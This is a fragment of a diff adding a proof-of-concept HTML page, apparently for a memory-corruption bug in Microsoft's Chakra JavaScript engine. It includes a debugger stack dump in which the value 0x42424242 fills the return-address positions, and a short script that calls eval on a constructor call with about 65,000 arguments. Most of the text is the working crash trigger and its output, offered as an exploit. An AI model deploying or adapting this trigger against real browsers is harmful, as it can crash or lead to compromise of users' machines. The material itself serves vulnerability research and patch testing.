+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4ac
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+
+
+-->
+<html>
+<head>
+<title> POC </title>
+</head>
+<script>
+
+var a = '0x42424242,'.repeat(0xFFFF-2); 
+var b = "function Car(){} var car = new Car(a,"+a+"a);";
+eval(b);
+
+</script>
+</html>
